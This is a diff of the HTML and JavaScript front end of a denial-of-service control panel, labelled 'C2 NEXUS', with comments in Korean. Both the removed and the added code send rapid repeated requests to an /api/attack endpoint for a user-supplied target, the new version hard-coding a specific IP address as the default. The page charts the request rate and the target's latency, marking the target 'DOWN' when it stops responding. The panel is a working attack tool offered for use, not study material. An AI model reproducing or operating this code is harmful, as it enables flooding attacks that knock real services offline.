@@ -3,240 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☢️ EDGE-FLOW v11.0 NEXUS</title>
+    <title>☢️ EDGE-FLOW v13.0 STREAM</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
-        :root { --neon: #00ff41; --bg: #030303; --panel: #0a0a0a; --border: #1a1a1a; --warn: #ff3e3e; --recon: #f0f000; --active-bg: rgba(0, 255, 65, 0.1); }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
-        body { background: var(--bg); color: var(--neon); font-family: 'SF Pro Display', -apple-system, sans-serif; margin: 0; padding: 10px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; font-size: 14px; }
+        :root { --neon: #00ff41; --bg: #050505; --panel: #111; --border: #222; --warn: #ff0000; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'JetBrains Mono', monospace; }
+        body { background: var(--bg); color: var(--neon); margin: 0; padding: 10px; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
-        /* 헤더: 전황 상태바 */
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 5px; border-bottom: 2px solid var(--border); margin-bottom: 8px; text-shadow: 0 0 10px rgba(0,255,65,0.4); }
-        .header h1 { margin:0; font-size: 1.1em; font-weight: 900; letter-spacing: -1px; }
-        #statusText { padding: 2px 6px; border-radius: 4px; border: 1px solid var(--neon); font-size: 0.8em; font-weight: bold; transition: 0.3s; }
-
-        /* 타겟 주소창 */
-        .control-block { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 10px; margin-bottom: 8px; }
-        label { display: block; margin-bottom: 3px; font-size: 0.7em; color: #666; text-transform: uppercase; font-weight: 700; }
-        input[type="text"] { background: #000; border: 1px solid var(--border); color: var(--neon); padding: 12px; width: 100%; border-radius: 6px; font-size: 1.1em; font-family: monospace; outline: none; transition: 0.2s; }
-        input[type="text"]:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(0,255,65,0.2); }
-
-        /* 화력 통제소: 터치 최적화 버튼 */
-        .fire-control { display: flex; flex-direction: column; gap: 8px; margin-bottom: 8px; }
-        button { border-radius: 8px; border: none; font-weight: 900; text-transform: uppercase; font-size: 1.1em; cursor: pointer; transition: 0.1s; position: relative; overflow: hidden; }
-        button:active { transform: scale(0.97); }
-
-        /* 지휘관을 위한 화력 집중 버튼 */
-        #startBtn { background: var(--neon); color: #000; padding: 20px 5px; box-shadow: 0 4px 15px rgba(0,255,65,0.3); font-size: 1.3em;}
-        #startBtn::after { content: ''; position: absolute; top:0; left:0; width:100%; height:100%; background: linear-gradient(rgba(255,255,255,0.1), transparent); }
-
-        .recon-stop-group { display: grid; grid-template-columns: 2fr 1fr; gap: 8px; }
-        #reconBtn { background: var(--recon); color: #000; padding: 12px 5px; font-size: 1em; }
-        #stopBtn { background: #1a1a1a; color: #888; border: 1px solid #333; padding: 12px 5px; font-size: 1em; }
-
-        /* 대시보드: 화력 측정 및 그래프 */
-        .dashboard { flex-grow: 1; background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 8px; display: flex; flex-direction: column; gap: 6px; overflow: hidden;}
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--neon); padding-bottom: 5px; margin-bottom: 10px; }
+        .control-box { background: var(--panel); border: 1px solid var(--border); border-radius: 10px; padding: 15px; margin-bottom: 10px; }
         
-        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
-        .stat-card { background: #111; border: 1px solid #222; border-radius: 6px; padding: 8px; text-align: center; }
-        .stat-label { font-size: 0.65em; color: #555; text-transform: uppercase; margin-bottom: 2px; }
-        .stat-value { font-size: 1.6em; font-weight: 800; letter-spacing: -1px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;}
+        input { background: #000; border: 1px solid var(--border); color: var(--neon); padding: 12px; width: 100%; border-radius: 5px; font-size: 1.1em; margin-bottom: 10px; outline: none; text-align: center; }
         
-        /* 그래프 배치 */
-        .chart-box { background: #000; border: 1px solid #222; border-radius: 6px; padding: 4px; position: relative; min-height: 120px; flex-grow: 1;}
-        .chart-title { position: absolute; top: 3px; left: 8px; font-size: 0.6em; color: #444; z-index: 10; text-transform: uppercase; }
-        
-        /* 작전 로그 축소 */
-        #terminal { background: #050505; border: 1px solid #222; border-radius: 6px; padding: 5px; height: 50px; overflow-y: auto; font-family: monospace; font-size: 10px; line-height: 1.3; margin-top: 5px;}
-        .log-entry { margin-bottom: 2px; border-left: 2px solid var(--neon); padding-left: 6px; }
-        .log-err { color: var(--warn); border-left-color: var(--warn); }
+        /* 화력 조절 레버 느낌의 버튼 */
+        #streamBtn { background: var(--neon); color: #000; width: 100%; padding: 20px; font-size: 1.3em; font-weight: 900; border: none; border-radius: 5px; cursor: pointer; transition: 0.2s; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
+        #streamBtn.active { background: var(--warn); color: #fff; box-shadow: 0 0 20px rgba(255,0,0,0.4); animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+
+        .dashboard { flex-grow: 1; display: grid; grid-template-rows: auto 1fr 1fr; gap: 10px; }
+        .stat-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .stat-card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 10px; text-align: center; }
+        .chart-container { background: #000; border: 1px solid var(--border); border-radius: 8px; position: relative; min-height: 120px; }
+        .label { position: absolute; top: 5px; left: 10px; font-size: 0.7em; color: #555; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>[ EDGE-FLOW NEXUS ]</h1>
-        <span id="statusText">STANDBY</span>
+        <h2 style="margin:0">C2 NEXUS v13.0</h2>
+        <div id="status">[WAITING]</div>
     </div>
 
-    <div class="main-panel">
-        <div class="control-block">
-            <label>TARGET COMMAND / URL</label>
-            <input type="text" id="target" value="http://" placeholder="http://1.2.3.4/">
+    <div class="control-box">
+        <input type="text" id="target" value="http://116.33.6.26/" placeholder="TARGET IP">
+        <button id="streamBtn" onclick="toggleStream()">STREAM START</button>
+    </div>
+
+    <div class="dashboard">
+        <div class="stat-row">
+            <div class="stat-card">
+                <div style="font-size:0.6em; color:#666">TOTAL PAYLOAD</div>
+                <div id="totalVal" style="font-size:1.5em; font-weight:bold">0</div>
+            </div>
+            <div class="stat-card">
+                <div style="font-size:0.6em; color:#666">STREAM LATENCY</div>
+                <div id="latVal" style="font-size:1.5em; font-weight:bold">--</div>
+            </div>
         </div>
 
-        <div class="fire-control">
-            <button id="startBtn" onclick="initiate()">INITIATE TOTAL WAR</button>
-            <div class="recon-stop-group">
-                <button id="reconBtn" onclick="analyzeTarget()">CHECK TARGET</button>
-                <button id="stopBtn" onclick="terminate()">STOP</button>
-            </div>
+        <div class="chart-container">
+            <span class="label">SUSTAINED FIREPOWER (PPS)</span>
+            <canvas id="pChart"></canvas>
         </div>
-
-        <div class="dashboard">
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-label">TOTAL PAYLOAD</div>
-                    <div class="stat-value" id="shotCount">0</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-label">LATENCY (MS)</div>
-                    <div class="stat-value" id="latencyDisplay" style="color:#666">--</div>
-                </div>
-            </div>
-            
-            <div class="chart-box">
-                <div class="chart-title">TRAFFIC LOAD (PPS)</div>
-                <canvas id="trafficChart"></canvas>
-            </div>
-            
-            <div class="chart-box">
-                <div class="chart-title">TARGET VITALS (MS)</div>
-                <canvas id="latencyChart"></canvas>
-            </div>
-            
-            <div id="terminal">>> Nexus v11.0 [TOUCH] Online. Waiting for command...</div>
+        <div class="chart-container">
+            <span class="label">TARGET STABILITY (MS)</span>
+            <canvas id="lChart"></canvas>
         </div>
     </div>
 
     <script>
-        let attackInterval = null;
-        let totalShots = 0;
-        let lastShots = 0;
-        let trafficChart, latencyChart;
+        let streaming = false, total = 0, last = 0, pChart, lChart;
 
-        // [UI] 그래프 초기화 (모바일 최적화)
-        window.onload = function() {
-            trafficChart = createChart('trafficChart', '#00ff41');
-            latencyChart = createChart('latencyChart', '#f0f000');
-            
-            // 1초마다 화력 그래프 업데이트
+        window.onload = () => {
+            pChart = initChart('pChart', '#00ff41');
+            lChart = initChart('lChart', '#f0f000');
             setInterval(() => {
-                if(attackInterval) {
-                    const pps = totalShots - lastShots;
-                    updateChart(trafficChart, pps);
-                    lastShots = totalShots;
+                if(streaming) {
+                    const pps = total - last;
+                    updateChart(pChart, pps);
+                    last = total;
+                    autoRecon(); // 스트리밍 중 실시간 체크
                 }
             }, 1000);
         };
 
-        function createChart(id, color) {
-            const ctx = document.getElementById(id).getContext('2d');
-            return new Chart(ctx, {
+        function initChart(id, color) {
+            return new Chart(document.getElementById(id), {
                 type: 'line',
-                data: { labels: Array(25).fill(''), datasets: [{ data: Array(25).fill(0), borderColor: color, borderWidth: 2, tension: 0.4, fill: true, backgroundColor: color + '11', pointRadius: 0 }] },
-                options: { responsive: true, maintainAspectRatio: false, scales: { y: { beginAtZero: true, grid: { color: '#111' }, ticks: { display: false } }, x: { display: false } }, plugins: { legend: { display: false } }, animation: { duration: 150 } }
+                data: { labels: Array(30).fill(''), datasets: [{ data: Array(30).fill(0), borderColor: color, borderWidth: 2, tension: 0.4, fill: true, backgroundColor: color+'05', pointRadius: 0 }] },
+                options: { responsive: true, maintainAspectRatio: false, animation: false, scales: { y: { display: false }, x: { display: false } }, plugins: { legend: { display: false } } }
             });
         }
 
-        function updateChart(chart, value) {
-            chart.data.datasets[0].data.push(value);
+        function updateChart(chart, val) {
+            chart.data.datasets[0].data.push(val);
             chart.data.datasets[0].data.shift();
-            chart.update('none'); // 애니메이션 없이 즉시 업데이트
+            chart.update('none');
         }
 
-        function log(msg, isErr = false) {
-            const term = document.getElementById('terminal');
-            const div = document.createElement('div');
-            div.className = `log-entry ${isErr ? 'log-err' : ''}`;
-            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            term.prepend(div);
-            if (term.childNodes.length > 20) term.removeChild(term.lastChild);
-        }
-
-        // [최종 정찰 요격기 v8.5 호환] - 이미지 핑 방식 채택
-        async function analyzeTarget() {
-            let target = document.getElementById('target').value.trim();
-            if (!target.startsWith('http')) { log("URL ERROR", true); return; }
+        // [핵심] 화력을 잘게 쪼개서 무한 전송하는 엔진
+        function streamAttack() {
+            if(!streaming) return;
+            const url = document.getElementById('target').value;
             
-            log("📡 SCANNING TARGET Vital Signs...");
-            document.getElementById('reconBtn').innerText = "SCANNING...";
-            document.getElementById('reconBtn').style.opacity = "0.7";
-            const start = Date.now();
+            // 한 번에 10개씩만, 하지만 아주 빠르게(20ms 간격) 보냄
+            for(let i=0; i<10; i++) {
+                fetch(`/api/attack?target=${encodeURIComponent(url)}&ts=${Date.now()}`)
+                .then(() => { total += 12000; document.getElementById('totalVal').innerText = total.toLocaleString(); })
+                .catch(() => {});
+            }
             
-            const img = new Image();
-            const timeout = setTimeout(() => {
-                img.onload = img.onerror = null;
-                updateLatency(9999);
-                log("<span class='log-recon'>💀 격침 확인!</span>", true);
-                resetReconBtn();
-            }, 7000);
-
-            img.onload = img.onerror = () => {
-                clearTimeout(timeout);
-                const ms = Date.now() - start;
-                resetReconBtn();
-                if (ms > 15) { // 15ms 미만은 가짜 응답
-                    updateLatency(ms);
-                    log(`🟢 RESPONSE DETECTED: ${ms}ms`);
-                }
-            };
-            
-            img.src = `${target}favicon.ico?cb=${start}`;
+            // 0.02초마다 재실행하여 끊김 없는 스트림 형성
+            setTimeout(streamAttack, 20);
         }
 
-        function resetReconBtn() {
-            const btn = document.getElementById('reconBtn');
-            btn.innerText = "CHECK TARGET";
-            btn.style.opacity = "1";
-        }
-
-        function updateLatency(ms) {
-            const display = document.getElementById('latencyDisplay');
-            if (ms === 9999) {
-                display.innerText = "DOWN";
-                display.style.color = "var(--warn)";
-                updateChart(latencyChart, 0); // 격침 시 그래프 0
-            } else {
-                display.innerText = `${ms}ms`;
-                if (ms < 150) display.style.color = "#00ff41";
-                else if (ms < 500) display.style.color = "#f0f000";
-                else if (ms < 1500) display.style.color = "#ff9f00";
-                else display.style.color = "#ff3e3e";
-                updateChart(latencyChart, ms);
+        async function autoRecon() {
+            const url = document.getElementById('target').value;
+            const s = Date.now();
+            try {
+                await fetch(url, { mode: 'no-cors', cache: 'no-store' });
+                const ms = Date.now() - s;
+                document.getElementById('latVal').innerText = ms + "ms";
+                updateChart(lChart, ms);
+            } catch(e) {
+                const ms = Date.now() - s;
+                document.getElementById('latVal').innerText = ms > 3000 ? "DOWN" : ms + "ms";
+                updateChart(lChart, ms > 3000 ? 3000 : ms);
             }
         }
 
-        async function initiate() {
-            const target = document.getElementById('target').value.trim();
-            if (!target.startsWith('http')) { log("URL ERROR", true); return; }
-
-            toggleButtons(true);
-            log(`🚀 TOTAL WAR DECLARED ON ${target}`);
-
-            // v11.0 NEXUS는 공격 효율을 위해 내부 스레드 고정 (GOD MODE 50x)
-            attackInterval = setInterval(() => {
-                for(let i=0; i < 50; i++) {
-                    fetch(`/api/attack?target=${encodeURIComponent(target)}&cb=${Math.random()}`)
-                    .then(() => {
-                        totalShots += 15000;
-                        document.getElementById('shotCount').innerText = totalShots.toLocaleString();
-                    }).catch(() => {});
-                }
-            }, 50); // MAX RATE
-        }
-
-        function toggleButtons(running) {
-            const status = document.getElementById('statusText');
-            status.innerText = running ? "FIRING" : "STANDBY";
-            status.style.color = running ? "var(--warn)" : "var(--neon)";
-            status.style.borderColor = running ? "var(--warn)" : "var(--neon)";
+        function toggleStream() {
+            const btn = document.getElementById('streamBtn');
+            const status = document.getElementById('status');
+            streaming = !streaming;
             
-            const startBtn = document.getElementById('startBtn');
-            startBtn.innerText = running ? "TOTAL DESTRUCTION" : "INITIATE TOTAL WAR";
-            startBtn.style.background = running ? "rgba(255,62,62,0.1)" : "var(--neon)";
-            startBtn.style.color = running ? "var(--warn)" : "#000";
-            startBtn.style.border = running ? "1px solid var(--warn)" : "none";
-            startBtn.disabled = running;
-            
-            const stopBtn = document.getElementById('stopBtn');
-            stopBtn.style.border = running ? "1px solid var(--warn)" : "1px solid #333";
-            stopBtn.style.color = running ? "var(--warn)" : "#888";
-        }
-
-        function terminate() {
-            clearInterval(attackInterval);
-            toggleButtons(false);
-            log("🛑 MISSION CEASED.", true);
+            if(streaming) {
+                btn.innerText = "STREAMING...";
+                btn.classList.add('active');
+                status.innerText = "[ACTIVE]";
+                status.style.color = "var(--warn)";
+                streamAttack();
+            } else {
+                btn.innerText = "STREAM START";
+                btn.classList.remove('active');
+                status.innerText = "[WAITING]";
+                status.style.color = "var(--neon)";
+            }
         }
     </script>
 </body>
